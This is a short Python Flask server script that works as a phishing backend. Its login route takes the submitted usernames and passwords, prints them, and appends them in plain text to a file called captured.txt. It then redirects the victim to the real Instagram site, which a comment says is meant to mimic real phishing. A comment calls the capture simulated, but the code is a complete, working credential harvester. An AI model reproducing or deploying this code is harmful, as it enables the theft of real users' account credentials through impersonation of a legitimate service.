from flask import Flask, render_template, request, redirect

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    # Simulate capturing data (log to console and file)
    print(f"Captured: Username: {username}, Password: {password}")
    with open('captured.txt', 'a') as f:
        f.write(f"Username: {username}, Password: {password}\n")
    
    # Redirect to real Instagram to mimic real phishing
    return redirect('https://www.instagram.com/')

if __name__ == '__main__':
    app.run(debug=True)